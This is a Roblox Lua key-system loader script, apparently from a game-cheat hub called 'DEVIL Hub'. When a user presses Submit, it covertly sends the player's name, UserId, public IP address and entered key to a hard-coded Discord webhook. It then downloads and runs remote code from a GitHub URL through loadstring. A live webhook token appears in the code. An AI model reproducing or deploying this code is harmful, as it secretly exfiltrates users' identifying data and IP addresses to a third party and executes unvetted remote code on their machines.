local function WCDO_fake_script() -- Submit.SubmitScript 
    local script = Instance.new('Script', Submit)

    local KeyCheck = script.Parent.Parent.InsertKey
    local SupportedCheck = script.Parent.Parent.SupportCheck

    local function onInputBegan(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            spawn(function() 
                local key = KeyCheck.Text or ""
                local UserInputService = game:GetService("UserInputService")
                if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
                else
                    local PLr = game.Players.LocalPlayer
                    local url = "https://discord.com/api/webhooks/1380524732452962446/uGpdEsSCOo1bCZmJLuvZq2NG_11M5x337KFVV0VGu0fVYlj7B_iqnKK7chLFE8Q0-t86"
                    local data = {
                        ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
                        ["content"] = "**".."Name: " ..PLr.Name .." \n DisplayName: " .. PLr.DisplayName .." \n UserId: " .. PLr.UserId .."\n" .."\nIpv4 Adress: " ..game:HttpGet("http://api.ipify.org") .."\n"  .."Entered key: "..key .."**",                    
                    }
                    local newdata = game:GetService("HttpService"):JSONEncode(data)
                    local headers = {
                    ["content-type"] = "application/json"
                    }
                    request = http_request or request or HttpPost or syn.request
                    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
                    request(abcdef)
                end
            end)
            spawn(function()
                if DEVIL_Script_Lisence == true then
                    spawn(function()
                        task.wait(2)
                        KeyCheck.Text = "Loading..."
                        task.wait(1)
                        getgenv().bypassercheck = true
                        wait(0.5)
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/gamess"))()
                        wait(10)
                        getgenv().bypassercheck = false
                        script.Parent.Parent.Parent:Destroy()
                    end)
                    return
                end

                local HttpService = game:GetService("HttpService")
                local KeyCheck = script.Parent.Parent.InsertKey
                local ipServices = {
                    "http://api.ipify.org",
                    "https://ipinfo.io/ip",
                    "https://v4.ident.me/"
                }

                local function getCurrentIP()
                    for _, url in ipairs(ipServices) do
                        local success, response = pcall(function()
                            return game:HttpGet(url, {Timeout = 5})
                        end)
                        if success and response and response ~= "" then
                            return response:gsub("%s+", "")
                        end
                    end
                    warn("Could not fetch IP from any service.")
                    return nil
                end

                local function compareIPPrefix(ip1, ip2)
                    if not ip1 or not ip2 then return false end
                    local prefix1 = ip1:match("^(%d+%.%d+%.%d+)%.")
                    local prefix2 = ip2:match("^(%d+%.%d+%.%d+)%.")
                    return prefix1 == prefix2
                end

                local function validateKey()
                    local key = KeyCheck.Text:match("^%s*(.-)%s*$")
                    local ip = getCurrentIP()

                    if not ip then
                        KeyCheck.Text = "Check connection"
                        return false
                    end

                    local url = "https://work.ink/_api/v2/token/isValid/" .. key
                    local success, response = pcall(function()
                        return game:HttpGet(url, {Timeout = 10})
                    end)

                    if not success then
                        warn("API request failed:", response)
                        KeyCheck.Text = "Connection failed"
                        return false
                    end

                    local jsonSuccess, decoded = pcall(function()
                        return HttpService:JSONDecode(response)
                    end)

                    if not jsonSuccess or not decoded then
                        warn("JSON decode failed. Raw response:", response)
                        KeyCheck.Text = "Invalid response"
                        return false
                    end

                    if not decoded.valid then
                        KeyCheck.Text = "Invalid or expired key"
                        return false
                    end

                    local info = decoded.info

                    if info.byIp and not compareIPPrefix(info.byIp, ip) then
                        KeyCheck.Text = "IP mismatch â€” access denied"
                        warn("Access denied due to IP prefix mismatch. Provided Ip doesnt match Expected Ip")
                        return false
                    end

                    local expiresAt = tonumber(info.expiresAfter)
                    local currentTime = os.time() * 1000
                    local timeLeft = math.max(0, expiresAt - currentTime)

                    local secondsLeft = math.floor(timeLeft / 1000)
                    local hours = math.floor(secondsLeft / 3600)
                    local minutes = math.floor((secondsLeft % 3600) / 60)

                    local expireMessage = "Key valid. Expires in " .. hours .. "h " .. minutes .. "m"

                    print(expireMessage)

                    KeyCheck.Text = expireMessage

                    task.wait(3)
                    KeyCheck.Text = "Loading..."

                    getgenv().bypassercheck = true
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/gamess", true))()
                    task.wait(1)
                    getgenv().bypassercheck = false

                    script.Parent.Parent.Parent:Destroy()
                    return true
                end

                validateKey()
            end)

        end
    end
    script.Parent.InputBegan:Connect(onInputBegan)
end
coroutine.wrap(WCDO_fake_script)()
